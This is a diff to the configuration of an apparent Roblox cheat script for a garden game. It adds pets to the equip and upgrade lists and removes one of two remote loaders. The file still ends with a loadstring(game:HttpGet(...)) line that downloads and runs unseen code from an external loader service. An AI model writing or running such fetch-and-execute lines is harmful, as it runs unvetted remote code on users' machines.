@@ -34,8 +34,8 @@ getgenv().gagConfig = {
     KEEP_PETS_WEIGHT = 5,
 
     -- EQUIP_PETS Priority (Left -> Right)
-    EQUIP_PETS = { ["Lemon Lion"] = 1, ["Grey Mous"] = 2, ["Brown Mouse"] = 2, ["Orange Tabby"] = 2 },
-    USE_PETS_FOR_UPGRADE_SLOT = { "Grey Mous", "Orange Tabby" },
+    EQUIP_PETS = { ["Lemon Lion"] = 1, ["Grey Mous"] = 2, ["Brown Mouse"] = 2, ["Orange Tabby"] = 2, ["Golden Lab"] = 2, ["Dog"] =2, ["Bunny"] = 2 },
+    USE_PETS_FOR_UPGRADE_SLOT = { "Grey Mous", "Orange Tabby", "Bunny", "Dog", "Golden Lab" },
 
     BUY_GEAR_SHOP = { "Grandmaster Sprinkler", "Master Sprinkler", "Godly Sprinkler", "Advanced Sprinkler", "Basic Sprinkler" },
     USE_SPRINKLER = { "Grandmaster Sprinkler", "Basic Sprinkler", "Master Sprinkler", "Godly Sprinkler", "Advanced Sprinkler" },
@@ -49,5 +49,3 @@ getgenv().gagConfig = {
     SHOW_WEBHOOK_USERNAME = true,
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a2234a9cfbe480dfed9eaf6c00a012ca.lua"))()
-wait(2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xitrumhub/RB/refs/heads/main/bebebe1123"))()
